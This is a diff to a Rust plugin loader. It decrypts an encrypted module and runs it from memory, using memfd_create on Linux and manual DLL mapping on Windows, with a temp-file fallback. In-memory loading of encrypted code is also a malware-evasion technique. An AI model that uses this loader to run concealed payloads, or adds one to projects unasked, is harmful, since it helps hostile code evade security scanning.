@@ -79,42 +79,6 @@ pub fn load_plugin(encrypted_blob: &[u8], session: &CryptoSession) -> Result<Box
     let module_data = decrypted_blob.as_slice();
 
     // 2. Load the library from memory.
-    #[cfg(windows)]
-    let library = {
-        info!("Loading plugin using manual map loader.");
-        let image_base = unsafe { manual_map::load_dll_in_memory(module_data)? };
-        // For manual mapping, we don't get a `Library` object in the same way.
-        // We need to find the export manually.
-        // This is a simplification; a real implementation would parse the export table.
-        let create_func_addr = unsafe {
-            let pe = goblin::pe::PE::parse(module_data)?;
-            let export_dir = pe
-                .exports
-                .get(0)
-                .ok_or_else(|| anyhow!("No exports found"))?;
-            let func_name = "_create_plugin";
-            let mut func_rva = 0;
-            for export in pe.exports {
-                if let Some(name) = export.name {
-                    if name == func_name {
-                        func_rva = export.rva;
-                        break;
-                    }
-                }
-            }
-            if func_rva == 0 {
-                return Err(anyhow!("Could not find _create_plugin export"));
-            }
-            image_base.add(func_rva)
-        };
-
-        let create_func: unsafe extern "C" fn() -> *mut dyn Plugin =
-            unsafe { std::mem::transmute(create_func_addr) };
-        let plugin_ptr = unsafe { create_func() };
-        let plugin = unsafe { Box::from_raw(plugin_ptr) };
-        return Ok(plugin);
-    };
-
     #[cfg(target_os = "linux")]
     let library = {
         // On Linux, we use `memfd_create` to get an in-memory file descriptor.
@@ -140,8 +104,36 @@ pub fn load_plugin(encrypted_blob: &[u8], session: &CryptoSession) -> Result<Box
         unsafe { Library::new(path)? }
     };
 
-    #[cfg(not(any(target_os = "linux", target_os = "windows")))]
+    #[cfg(not(target_os = "linux"))]
     let library = {
+        #[cfg(target_os = "windows")]
+        {
+            info!("Attempting to load plugin using manual map loader.");
+            if let Ok(image_base) = unsafe { manual_map::load_dll_in_memory(module_data) } {
+                let func_addr = unsafe {
+                    let pe = goblin::pe::PE::parse(module_data).ok();
+                    let mut rva = 0;
+                    if let Some(pe) = pe {
+                        for export in pe.exports {
+                            if let Some(name) = export.name {
+                                if name == "_create_plugin" {
+                                    rva = export.rva;
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                    if rva != 0 {
+                        let create_func: unsafe extern "C" fn() -> *mut dyn Plugin =
+                            std::mem::transmute(image_base.add(rva));
+                        let plugin_ptr = create_func();
+                        let plugin = Box::from_raw(plugin_ptr);
+                        return Ok(plugin);
+                    }
+                };
+            }
+            info!("Manual map failed or _create_plugin not found, falling back to temp file.");
+        }
         // Fallback for non-Linux OSs (e.g., macOS, Windows).
         // For Windows, a more advanced technique involves CreateFileMapping/MapViewOfFile
         // with SEC_IMAGE, but for simplicity, we'll use a temporary file.
@@ -155,7 +147,7 @@ pub fn load_plugin(encrypted_blob: &[u8], session: &CryptoSession) -> Result<Box
             .suffix(std::env::consts::DLL_SUFFIX)
             .tempfile()?;
         let temp_path = temp_file.into_temp_path();
-        std::fs::write(&temp_path, &decrypted_blob)?;
+        std::fs::write(&temp_path, module_data)?;
         info!("Loading plugin from temporary file: {:?}", &*temp_path);
         // SAFETY: We trust the decrypted blob.
         let lib = unsafe { Library::new(&*temp_path)? };
